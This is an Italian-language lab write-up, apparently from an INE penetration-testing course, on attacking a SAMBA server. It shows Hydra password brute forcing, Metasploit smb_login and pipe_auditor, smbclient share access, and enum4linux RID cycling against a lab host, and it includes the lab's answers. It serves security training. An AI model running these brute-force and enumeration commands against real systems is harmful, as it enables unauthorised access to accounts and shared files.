# Exploiting SAMBA

<figure><img src="../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

## nmap scan per identificare SAMBA

<figure><img src="../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

## Bruteforce sull'istanza SAMBA con Hydra

Ai fini di questo laboratorio di esempio i nomi utente ci sono già stati forniti: admin e jane, proveremo a fare il brute force su admin:

```
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb
```

<figure><img src="../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

### Alternativa con MSF: modulo smb\_login

```
use auxiliary/scanner/smb/smb_login
show options
//configurare le opzioni
```

## smbmap: Samba Share Enumerator

```
smbmap
smbmap -H 192.56.47.3 -u admin -p password1
```

<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

## smbclient: Accedere alle share samba

```
smbclient
man smbclient
smbclient -L 192.56.47.3 -U admin //e ci chiederà la password
smbclient //192.56.47.3/shawn -U admin
?
dir
cd ..
dir
exit
smbclient //192.56.47.3/nancy -U admin
dir
cd dir
dir
get flag
exit
cat flag
smbclient //192.56.47.3/admin -U admin
cd hidden
dir
get flag.tar.gz
exit
rm flag
tar xzf flag.tar.gz
ls
cat flag
```

<figure><img src="../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

## enum4linux per enumerare le informazioni su SAMBA

```
enum4linux -a 192.56.47.3
enum4linux
enum4linux -a -u admin -p password1 192.56.47.3
```

Controlla le info che trova sul target e se è presente SAMBA ce lo mostra e prova a verificare se è possibile loggarsi a SAMBA tramite sessioni null, che in questo caso non sono consentite. In tal caso ci mostrebbe altre info

<figure><img src="../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

Se eseguiamo enum4linux con -a possiamo vedere che fa tutti i vari controlli:

<figure><img src="../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

Ci fornisce informazioni sul sistema operativo, sugli utenti di samba e le share. Tenta poi di mappare le share, password policy information, ed infine ottiene gli SIDs per tutti gli account.

### Elencare gli SID degli utenti unix scoperti con utente admin

List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

**Command:**

```
enum4linux -r -u "admin" -p "password1" demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/91317593ad613875d83c087ba16973aa2be07cd9aedb96e0b3293f575ad8c587.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/07c7fca787617998ce720f85b6d5a49372f0b8d4e1dc98330a9975f303391ae7.jpg" alt=""><figcaption></figcaption></figure>

Answer: S-1-22-1-1000, S-1-22-1-1001, S-1-22-1-1002, S-1-22-1-1003

## Elencare le named pipes disponibili via SAMBA

List the named pipes available over SMB on the samba server? Use pipe\_auditor metasploit module with credentials obtained from question 2.

Answer: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc

**Commands:**

```
msfconsole -q
use auxiliary/scanner/smb/pipe_auditor
set SMBUser admin
set SMBPass password1
set RHOSTS demo.ine.local
exploit
```

<figure><img src="https://assets.ine.com/lab/learningpath/78e1f07bdb3f215c09cf187a409fc84d2e31e61efcd6240e392f1d011e8269cb.jpg" alt=""><figcaption></figcaption></figure>
